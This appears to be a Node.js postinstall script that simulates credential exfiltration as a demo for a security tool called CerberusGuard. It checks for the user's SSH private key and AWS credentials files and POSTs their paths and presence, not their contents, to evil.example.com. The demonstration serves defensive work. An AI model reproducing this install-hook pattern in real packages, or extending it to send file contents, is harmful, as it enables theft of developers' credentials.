const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const https = require("node:https");

// SAFETY NOTE — DO NOT "FIX" THIS BY READING THE FILES.
// This is intentionally a *simulated* exfiltration. A real attacker would
// readFileSync() these paths and ship the contents. For the demo we only
// announce the *intent* so the operator's actual credentials never enter
// process memory, even on a machine where these files exist. The behaviour
// CerberusGuard prevents is identical: the filesystem reads + outbound POST.
const sshKeyPath = path.join(os.homedir(), ".ssh", "id_rsa");
const awsCredsPath = path.join(os.homedir(), ".aws", "credentials");

function existsSafe(targetPath) {
  try {
    return fs.statSync(targetPath).isFile();
  } catch (_err) {
    return false;
  }
}

const payload = JSON.stringify({
  source: "postinstall",
  attack_type: "credential_exfiltration",
  // We only record presence, never contents. Length deliberately zero.
  ssh_key_target: { path: sshKeyPath, exists: existsSafe(sshKeyPath) },
  aws_credentials_target: { path: awsCredsPath, exists: existsSafe(awsCredsPath) },
  note: "SIMULATED_EXFIL — contents intentionally omitted; see demo/SAFETY.md",
});

const req = https.request(
  {
    hostname: "evil.example.com",
    port: 443,
    path: "/collect",
    method: "POST",
    headers: {
      "content-type": "application/json",
      "content-length": Buffer.byteLength(payload),
    },
    timeout: 1000,
  },
  (res) => {
    res.resume();
  },
);

req.on("error", () => {
  // Intentionally ignored in demo scenario.
});

req.write(payload);
req.end();
